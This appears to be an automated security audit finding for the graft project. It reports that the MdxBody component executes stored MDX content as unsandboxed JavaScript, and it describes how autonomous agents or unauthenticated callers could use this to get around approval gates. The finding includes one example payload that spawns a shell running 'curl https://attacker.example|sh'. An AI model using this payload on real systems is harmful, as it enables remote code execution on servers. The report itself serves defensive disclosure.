# [HIGH] MdxBody executes stored content as arbitrary JavaScript in the Node process (stored RCE via content writes)

**File:** [`packages/sdk-next/src/mdx.tsx`](https://github.com/AndersonDesign1/graft/blob/feat/core/blob/feat/packages/sdk-next/src/mdx.tsx#L31-L52) (lines 31, 38, 48, 52)
**Project:** graft
**Severity:** HIGH  •  **Confidence:** medium  •  **Slug:** `rce`

## Owners

**Suggested assignee:** `josanderson25@gmail.com` _(via last-committer)_

## Finding

MdxBody compiles the stored MDX body with @mdx-js/mdx `compile()` and executes it via `run()`, which evaluates the compiled function-body inside `new Function` in the host Node runtime. Nothing restricts what the evaluated code can do: MDX expressions ({...}) execute arbitrary JavaScript with access to globals (process, globalThis.fetch, dynamic import()), and there is no rehype-sanitize, expression filtering, import allowlist, or VM sandboxing anywhere in the pipeline (verified across packages/compiler and packages/studio). The source string comes straight from content_index rows / on-disk .mdx files (e.g. examples/landing-page/components/page.tsx passes doc.body directly). Any actor with content-write capability can therefore achieve server-side code execution on the consuming app's production server the first time the page renders: (a) an autonomous agent writing documents via MCP functions — precisely threat #1/#3 in the project's own threat model, since this bypasses scopes, audit, and the destructive-op human gate that define Graft's security posture; (b) any unauthenticated caller of PUT /api/studio/v1/document when createStudioApiHandler is mounted without an `authorize` callback (the check is optional: `if (options.authorize)`); (c) anyone holding the runtime DB credential. Example payload body: `{await import("node:child_process").then(m => m.execSync("curl https://attacker.example|sh"))} {0}`. This escalates a 'content author' privilege to full host RCE, crossing the trust boundary the approval system exists to enforce.

## Recommendation

Do not evaluate authored bodies as unconstrained JavaScript. Options: compile with restrictions that reject raw JS expressions/imports for non-operator content (custom remark/rehype pass or MDX `remark-mdx-disable-expressions`), render untrusted bodies with a safe Markdown renderer instead of MDX, or isolate evaluation in a restricted sandbox (worker/VM with no process/net access) and reserve full-MDX rendering for operator-signed content only. Additionally, make the Studio `authorize` callback mandatory (fail closed) so content writes cannot be unauthenticated.

## Revalidation

**Verdict:** true-positive

Verified the sink and the sources. MdxBody compiles the stored body with @mdx-js/mdx compile({outputFormat:'function-body'}) and executes it via run({...runtime, baseUrl}) (mdx.tsx L31-52) — run evaluates the compiled function-body via new Function in-process, with no sandbox, no expression/import restriction, and no sanitize plugin anywhere in the pipeline (grep across compiler/studio/sdk-next confirms); MDX expressions and import() therefore execute arbitrary Node-side JS with process access. The source flows unmodified from content_index rows/disk into rendering — examples/landing-page/components/page.tsx L30 and app/products/page.tsx L42 pass doc.body directly, and README/design docs position MdxBody as the standard React render path. The write side of the trust boundary is genuinely porous in this codebase: MCP write_content has NO scope or actor check (guarded() is only error translation), HTTP MCP may run anonymous when GRAFT_MCP_REQUIRE_AUTH is off, Studio PUT /document is unauthenticated on loopback and gated only by F1's binary check remotely, and content writes are not approval-gated — while the project's own threat model treats autonomous agents as semi-trusted authors requiring human gates precisely for high-impact actions. Stored JS execution on the render host is strictly more powerful than any destructive op the approval system protects, so the privilege escalation crosses a documented boundary rather than reflecting intended MDX power for trusted operators alone. One could argue CRITICAL, but HIGH as filed is reasonable.

## Recent committers (`git log`)

- AndersonDesign1 <josanderson25@gmail.com> (2026-07-09)
